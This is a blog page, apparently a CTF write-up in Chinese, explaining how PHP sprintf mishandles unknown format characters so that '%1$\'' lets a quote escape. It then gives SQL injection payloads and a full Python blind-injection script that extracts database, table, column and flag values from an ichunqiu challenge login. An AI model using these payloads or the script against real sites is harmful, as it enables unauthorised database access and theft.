@@ -1,0 +1,692 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="Yu ting">
+  <meta name="keywords" content="">
+  <title>sprintf格式化字符串漏洞 - liquor&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"liquor-boop.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="sprintf格式化字符串漏洞">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-04-10 14:12" pubdate>
+        April 10, 2021 pm
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.9k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      29
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">sprintf格式化字符串漏洞</h1>
+            
+            <div class="markdown-body">
+              <h4 id="sprintf"><a class="header-anchor" href="#sprintf">🍭</a>sprintf()</h4>
+<p>把格式化的字符串写入变量中。</p>
+<pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">sprintf</span><span class="hljs-params">(format,arg1,arg2,arg++)</span></span></code></pre>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><em>format</em></td>
+<td>规定字符串以及如何格式化其中的变量。                                                                            可能的格式值：                                                                                                                           %% - 返回一个百分号                                                                                                            % %b - 二进制数                                                                                                                               %c - ASCII 值对应的字符                                                                                                                         %d - 包含正负号的十进制数（负数、0、正数）                                                                                      %e - 使用小写的科学计数法（例如 1.2e+2）                                                                                          %E - 使用大写的科学计数法（例如 1.2E+2）                                                                                        %u - 不包含正负号的十进制数（大于等于 0）                                                                                      %f - 浮点数（本地设置）                                                                                                                           %F - 浮点数（非本地设置）                                                                                                                  %g - 较短的 %e 和 %f                                                                                                                            %G - 较短的 %E 和 %f                                                                                                                              %o - 八进制数                                                                                                                                            %s - 字符串                                                                                                                                               %x - 十六进制数（小写字母）                                                                                            %X - 十六进制数（大写字母）                                                                                                                                        附加的格式值。必需放置在 % 和字母之间（例如 %.2f）：                                                                                 + （在数字前面加上 + 或 - 来定义数字的正负性。默认情况下，只有负数才做标记，正数不做标记）                                                                                                                                          ’ （规定使用什么作为填充，默认是空格。它必须与宽度指定器一起使用。例如：%'x20s（使用 “x” 作为填充））                                                                                                                  - （左调整变量值）                                                                                                                                          [0-9] （规定变量值的最小宽度）                                                                                                                  .[0-9] （规定小数位数或最大字符串长度）                                                                                                    注释：如果使用多个上述的格式值，它们必须按照以上顺序使用。</td>
+</tr>
+<tr>
+<td><em>arg1</em>、<em>arg2</em>、<em>++</em></td>
+<td>将被插入到主字符串中的百分号（%）符号处。该函数是逐步执行的。在第一个 % 符号处，插入 <em>arg1</em>，在第二个 % 符号处，插入 <em>arg2</em>，依此类推。</td>
+</tr>
+</tbody>
+</table>
+<p>注释：如果 % 符号多于 <em>arg</em> 参数，则您必须使用占位符。占位符位于 % 符号之后，由数字和 “$” 组成</p>
+<h4 id="举个栗子"><a class="header-anchor" href="#举个栗子">🍭</a>举个栗子</h4>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+$num1 = <span class="hljs-number">123456789</span>;
+$num2 = <span class="hljs-number">-123456789</span>;
+$char = <span class="hljs-number">50</span>;
+<span class="hljs-keyword">echo</span> sprintf(<span class="hljs-string">&quot;%%b = %b&quot;</span>,$num1).<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>; <span class="hljs-comment">// 二进制数</span>
+<span class="hljs-keyword">echo</span> sprintf(<span class="hljs-string">&quot;%%c = %c&quot;</span>,$char).<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>; <span class="hljs-comment">// ASCII 字符</span>
+<span class="hljs-keyword">echo</span> sprintf(<span class="hljs-string">&quot;%%s = %s&quot;</span>,$num1).<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>; <span class="hljs-comment">// 字符串</span>
+<span class="hljs-keyword">echo</span> sprintf(<span class="hljs-string">&quot;%%x = %x&quot;</span>,$num1).<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>; <span class="hljs-comment">// 十六进制数（小写）</span>
+<span class="hljs-keyword">echo</span> sprintf(<span class="hljs-string">&quot;%%X = %X&quot;</span>,$num1).<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>; <span class="hljs-comment">// 十六进制数（大写）</span>
+<span class="hljs-meta">?&gt;</span>
+结果：
+%b = <span class="hljs-number">111010110111100110100010101</span>
+
+%c = <span class="hljs-number">2</span> 
+
+%s = <span class="hljs-number">123456789</span>
+
+%x = <span class="hljs-number">75</span>bcd15
+
+%X = <span class="hljs-number">75</span>BCD15</code></pre>
+<h3 id="sprintf注入原理"><a class="header-anchor" href="#sprintf注入原理">🍭</a><strong>sprintf注入原理</strong></h3>
+<p>sprintf()的底层实现方法：</p>
+<pre><code>switch (format[inpos]) &#123;
+case 's':
+    &#123;
+        zend_string * t;
+        zend_string * str = zval_get_tmp_string(tmp, &amp;t);
+        php_sprintf_appendstring( &amp; result, &amp;outpos, ZSTR_VAL(str), width, precision, padding, alignment, ZSTR_LEN(str), 0, expprec, 0);
+        zend_tmp_string_release(t);
+        break;
+    &#125;
+case 'd':
+    php_sprintf_appendint( &amp; result, &amp;outpos, zval_get_long(tmp), width, padding, alignment, always_sign);
+    break;
+case 'u':
+    php_sprintf_appenduint( &amp; result, &amp;outpos, zval_get_long(tmp), width, padding, alignment);
+    break;
+case 'g':
+case 'G':
+case 'e':
+case 'E':
+case 'f':
+case 'F':
+    php_sprintf_appenddouble( &amp; result, &amp;outpos, zval_get_double(tmp), width, padding, alignment, precision, adjusting, format[inpos], always_sign);
+    break;
+case 'c':
+    php_sprintf_appendchar( &amp; result, &amp;outpos, (char) zval_get_long(tmp));
+    break;
+case 'o':
+    php_sprintf_append2n( &amp; result, &amp;outpos, zval_get_long(tmp), width, padding, alignment, 3, hexchars, expprec);
+    break;
+case 'x':
+    php_sprintf_append2n( &amp; result, &amp;outpos, zval_get_long(tmp), width, padding, alignment, 4, hexchars, expprec);
+    break;
+case 'X':
+    php_sprintf_append2n( &amp; result, &amp;outpos, zval_get_long(tmp), width, padding, alignment, 4, HEXCHARS, expprec);
+    break;
+case 'b':
+    php_sprintf_append2n( &amp; result, &amp;outpos, zval_get_long(tmp), width, padding, alignment, 1, hexchars, expprec);
+    break;
+case '%':
+    php_sprintf_appendchar( &amp; result, &amp;outpos, '%');
+    break;
+default:
+    break;
+&#125;
+</code></pre>
+<h4 id="成因"><a class="header-anchor" href="#成因">🍭</a>成因</h4>
+<p>php源码中只对15种类型做了匹配， 其他字符类型都跳过未做任何处理，没做字符类型检测的最大危害就是它可以吃掉一个转义符, 如果%后面出现一个,那么php会把\当作一个格式化字符的类型而吃掉, 最后%\（或%1$\）被替换为空。<strong>%后的一个字符(除了%，%上面表格已经给出了)都会被当作字符型类型而被吃掉，也就是被当作一个类型进行匹配后面的变量，比如%c匹配asciii码，%d匹配整数，如果不在定义的也会匹配，匹配空，比如%\，这样我们的目的只有一个，使得单引号逃逸，也就是能够起到闭合的作用</strong></p>
+<h4 id="栗子"><a class="header-anchor" href="#栗子">🍭</a>栗子</h4>
+<p><strong>不使用占位符号</strong></p>
+<p><img src="/2021/04/10/wei6/1.png" srcset="/img/loading.gif" alt="1"></p>
+<p><strong>使用占位符号</strong></p>
+<p><img src="/2021/04/10/wei6/3.png" srcset="/img/loading.gif" alt="3"></p>
+<p><strong>利用%c</strong></p>
+<p><img src="/2021/04/10/wei6/2.png" srcset="/img/loading.gif" alt="2"></p>
+<p><strong>利用条件</strong></p>
+<ul>
+<li><strong>sql语句进行了字符拼接</strong></li>
+<li><strong>拼接语句和原sql语句都用了vsprintf/sprintf 函数来格式化字符串</strong></li>
+</ul>
+<h3 id="【ichunqiu】SQLI"><a class="header-anchor" href="#【ichunqiu】SQLI">🍭</a>【ichunqiu】SQLI</h3>
+<p>bp去测试过滤的符号发现%会出现不一样的情况</p>
+<p><img src="/2021/04/10/wei6/7.png" srcset="/img/loading.gif" alt="7"></p>
+<p>测试</p>
+<p><img src="/2021/04/10/wei6/4.jpg" srcset="/img/loading.gif" alt="4"></p>
+<p>sprintf函数出错，让单引号逃逸，构造：</p>
+<p><code>username=admin%1$' and 1=2# </code></p>
+<p><img src="/2021/04/10/wei6/5.jpg" srcset="/img/loading.gif" alt="5"></p>
+<p><code>username=admin%1$' and 1=1#</code></p>
+<p><img src="/2021/04/10/wei6/6.jpg" srcset="/img/loading.gif" alt="6"></p>
+<p>发现’后面的语句带入执行了，这就是注入点，可以sqlmap跑或者脚本</p>
+<p>脚本：</p>
+<pre><code class="hljs powershell"><span class="hljs-comment">#coding:utf-8</span>
+import requests
+import string
+ 
+def boom():
+    url = <span class="hljs-built_in">r</span><span class="hljs-string">&#x27;http://f6f0cdc51f8141a6b1a8634161859c1c78499dc70eea47f0.game.ichunqiu.com/&#x27;</span>
+    s = requests.session()
+	//会话对象requests.Session能够跨请求地保持某些参数，比如cookies，即在同一个Session实例发出的所有请求都保持同一个cookies,而requests模块每次会自动处理cookies，这样就很方便地处理登录时的cookies问题。
+    dic = string.digits + string.letters + <span class="hljs-string">&quot;!@#<span class="hljs-variable">$</span>%^&amp;*()_+&#123;&#125;-=&quot;</span>
+    right = <span class="hljs-string">&#x27;password error!&#x27;</span>
+    error = <span class="hljs-string">&#x27;username error!&#x27;</span>
+    lens = <span class="hljs-number">0</span>
+    i = <span class="hljs-number">0</span>
+	//确定当前数据库的长度
+    <span class="hljs-keyword">while</span> True:
+        payload = <span class="hljs-string">&quot;admin%1<span class="hljs-variable">$</span>\\&#x27; or &quot;</span> + <span class="hljs-string">&quot;length(database())&gt;&quot;</span> + str(i) + <span class="hljs-string">&quot;#&quot;</span>
+        <span class="hljs-keyword">data</span>=&#123;<span class="hljs-string">&#x27;username&#x27;</span>:payload,<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-number">1</span>&#125;
+        <span class="hljs-built_in">r</span> = s.post(url,<span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>).content
+        <span class="hljs-keyword">if</span> error <span class="hljs-keyword">in</span> <span class="hljs-built_in">r</span>:
+            lens=i
+            <span class="hljs-keyword">break</span>
+        i+=<span class="hljs-number">1</span>
+        pass
+    print(<span class="hljs-string">&quot;[+]length(database()): %d&quot;</span> %(lens))
+	//确定当前数据库的名字
+    strs=<span class="hljs-string">&#x27;&#x27;</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(lens+<span class="hljs-number">1</span>):
+        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> dic:
+            payload = <span class="hljs-string">&quot;admin%1<span class="hljs-variable">$</span>\\&#x27; or &quot;</span> + <span class="hljs-string">&quot;ascii(substr(database(),&quot;</span> + str(i) +<span class="hljs-string">&quot;,1))=&quot;</span> + str(ord(c)) + <span class="hljs-string">&quot;#&quot;</span>
+            <span class="hljs-keyword">data</span> = &#123;<span class="hljs-string">&#x27;username&#x27;</span>:payload,<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-number">1</span>&#125;
+            <span class="hljs-built_in">r</span> = s.post(url,<span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>).content
+            <span class="hljs-keyword">if</span> right <span class="hljs-keyword">in</span> <span class="hljs-built_in">r</span>:
+                strs = strs + c
+                print strs
+                <span class="hljs-keyword">break</span>
+        pass
+    pass
+    print(<span class="hljs-string">&quot;[+]database():%s&quot;</span> %(strs))
+ 
+    lens=<span class="hljs-number">0</span>
+    i = <span class="hljs-number">1</span>
+    <span class="hljs-keyword">while</span> True:
+        payload = <span class="hljs-string">&quot;admin%1<span class="hljs-variable">$</span>\\&#x27; or &quot;</span> + <span class="hljs-string">&quot;(select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)&gt;&quot;</span> + str(i) + <span class="hljs-string">&quot;#&quot;</span>
+		//对当前的数据库，查询第一个表的长度
+        <span class="hljs-keyword">data</span> = &#123;<span class="hljs-string">&#x27;username&#x27;</span>:payload,<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-number">1</span>&#125;
+        <span class="hljs-built_in">r</span> = s.post(url,<span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>).content
+        <span class="hljs-keyword">if</span> error <span class="hljs-keyword">in</span> <span class="hljs-built_in">r</span>:
+            lens = i
+            <span class="hljs-keyword">break</span>
+        i+=<span class="hljs-number">1</span>
+        pass
+    print(<span class="hljs-string">&quot;[+]length(table): %d&quot;</span> %(lens))
+ 
+    strs=<span class="hljs-string">&#x27;&#x27;</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(lens+<span class="hljs-number">1</span>):
+        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> dic:
+            payload = <span class="hljs-string">&quot;admin%1<span class="hljs-variable">$</span>\\&#x27; or &quot;</span> + <span class="hljs-string">&quot;ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),&quot;</span> + str(i) +<span class="hljs-string">&quot;,1))=&quot;</span> + str(ord(c)) + <span class="hljs-string">&quot;#&quot;</span>
+			// 数字一定要str才可以传入
+            <span class="hljs-keyword">data</span> = &#123;<span class="hljs-string">&#x27;username&#x27;</span>:payload,<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-number">1</span>&#125;
+            <span class="hljs-built_in">r</span> = s.post(url,<span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>).content
+            <span class="hljs-keyword">if</span> right <span class="hljs-keyword">in</span> <span class="hljs-built_in">r</span>:
+                strs = strs + c
+                print strs
+                <span class="hljs-keyword">break</span>
+        pass
+    pass
+    print(<span class="hljs-string">&quot;[+]table_name:%s&quot;</span> %(strs))
+    tablename = <span class="hljs-string">&#x27;0x&#x27;</span> + strs.encode(<span class="hljs-string">&#x27;hex&#x27;</span>)
+	//编码为<span class="hljs-number">16</span>进制
+    table_name = strs
+ 
+    lens=<span class="hljs-number">0</span>
+    i = <span class="hljs-number">0</span>
+    <span class="hljs-keyword">while</span> True:
+        payload = <span class="hljs-string">&quot;admin%1<span class="hljs-variable">$</span>\\&#x27; or &quot;</span> + <span class="hljs-string">&quot;(select length(column_name) from information_schema.columns where table_name = &quot;</span> + str(tablename) + <span class="hljs-string">&quot; limit 0,1)&gt;&quot;</span> + str(i) + <span class="hljs-string">&quot;#&quot;</span>
+        <span class="hljs-keyword">data</span> = &#123;<span class="hljs-string">&#x27;username&#x27;</span>:payload,<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-number">1</span>&#125;
+        <span class="hljs-built_in">r</span> = s.post(url,<span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>).content
+        <span class="hljs-keyword">if</span> error <span class="hljs-keyword">in</span> <span class="hljs-built_in">r</span>:
+            lens = i
+            <span class="hljs-keyword">break</span>
+        i+=<span class="hljs-number">1</span>
+        pass
+    print(<span class="hljs-string">&quot;[+]length(column): %d&quot;</span> %(lens))
+ 
+    strs=<span class="hljs-string">&#x27;&#x27;</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(lens+<span class="hljs-number">1</span>):
+        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> dic:
+            payload = <span class="hljs-string">&quot;admin%1<span class="hljs-variable">$</span>\\&#x27; or &quot;</span> + <span class="hljs-string">&quot;ascii(substr((select column_name from information_schema.columns where table_name = &quot;</span> + str(tablename) +<span class="hljs-string">&quot; limit 0,1),&quot;</span> + str(i) + <span class="hljs-string">&quot;,1))=&quot;</span> + str(ord(c)) + <span class="hljs-string">&quot;#&quot;</span>
+            <span class="hljs-keyword">data</span> = &#123;<span class="hljs-string">&#x27;username&#x27;</span>:payload,<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-number">1</span>&#125;
+            <span class="hljs-built_in">r</span> = s.post(url,<span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>).content
+            <span class="hljs-keyword">if</span> right <span class="hljs-keyword">in</span> <span class="hljs-built_in">r</span>:
+                strs = strs + c
+                print strs
+                <span class="hljs-keyword">break</span>
+        pass
+    pass
+    print(<span class="hljs-string">&quot;[+]column_name:%s&quot;</span> %(strs))
+    column_name = strs
+	
+    num=<span class="hljs-number">0</span>
+    i = <span class="hljs-number">0</span>
+    <span class="hljs-keyword">while</span> True:
+        payload = <span class="hljs-string">&quot;admin%1<span class="hljs-variable">$</span>\\&#x27; or &quot;</span> + <span class="hljs-string">&quot;(select count(*) from &quot;</span> + table_name + <span class="hljs-string">&quot;)&gt;&quot;</span> + str(i) + <span class="hljs-string">&quot;#&quot;</span>
+        <span class="hljs-keyword">data</span> = &#123;<span class="hljs-string">&#x27;username&#x27;</span>:payload,<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-number">1</span>&#125;
+        <span class="hljs-built_in">r</span> = s.post(url,<span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>).content
+        <span class="hljs-keyword">if</span> error <span class="hljs-keyword">in</span> <span class="hljs-built_in">r</span>:
+            num = i
+            <span class="hljs-keyword">break</span>
+        i+=<span class="hljs-number">1</span>
+        pass
+    print(<span class="hljs-string">&quot;[+]number(column): %d&quot;</span> %(num))
+ 
+    lens=<span class="hljs-number">0</span>
+    i = <span class="hljs-number">0</span>
+    <span class="hljs-keyword">while</span> True:
+        payload = <span class="hljs-string">&quot;admin%1<span class="hljs-variable">$</span>\\&#x27; or &quot;</span> + <span class="hljs-string">&quot;(select length(&quot;</span> + column_name + <span class="hljs-string">&quot;) from &quot;</span> + table_name + <span class="hljs-string">&quot; limit 0,1)&gt;&quot;</span> + str(i) + <span class="hljs-string">&quot;#&quot;</span>
+        <span class="hljs-keyword">data</span> = &#123;<span class="hljs-string">&#x27;username&#x27;</span>:payload,<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-number">1</span>&#125;
+        <span class="hljs-built_in">r</span> = s.post(url,<span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>).content
+        <span class="hljs-keyword">if</span> error <span class="hljs-keyword">in</span> <span class="hljs-built_in">r</span>:
+            lens = i
+            <span class="hljs-keyword">break</span>
+        i+=<span class="hljs-number">1</span>
+        pass
+    print(<span class="hljs-string">&quot;[+]length(value): %d&quot;</span> %(lens))
+ 
+    i=<span class="hljs-number">1</span>    
+    strs=<span class="hljs-string">&#x27;&#x27;</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(lens+<span class="hljs-number">1</span>):
+        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> dic:
+            payload = <span class="hljs-string">&quot;admin%1<span class="hljs-variable">$</span>\\&#x27; or ascii(substr((select flag from flag limit 0,1),&quot;</span> + str(i) + <span class="hljs-string">&quot;,1))=&quot;</span> + str(ord(c)) + <span class="hljs-string">&quot;#&quot;</span>
+            <span class="hljs-keyword">data</span> = &#123;<span class="hljs-string">&#x27;username&#x27;</span>:payload,<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span>&#125;
+            <span class="hljs-built_in">r</span> = s.post(url,<span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>).content
+            <span class="hljs-keyword">if</span> right <span class="hljs-keyword">in</span> <span class="hljs-built_in">r</span>:
+                strs = strs + c
+                print strs
+                <span class="hljs-keyword">break</span>
+        pass
+    pass
+    print(<span class="hljs-string">&quot;[+]flag:%s&quot;</span> %(strs))
+ 
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
+    boom()
+    print <span class="hljs-string">&#x27;Finish!&#x27;</span></code></pre>
+<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_41185953/article/details/80485075">深入解析sprintf格式化字符串漏洞</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/04/13/buu/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">BUUCTF | [RoarCTF 2019]Easy Calc</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/04/06/wei4/">
+                        <span class="hidden-mobile">SSTI(二)</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.start()
+    document.addEventListener('DOMContentLoaded', function() {
+      window.NProgress && window.NProgress.inc();
+    })
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
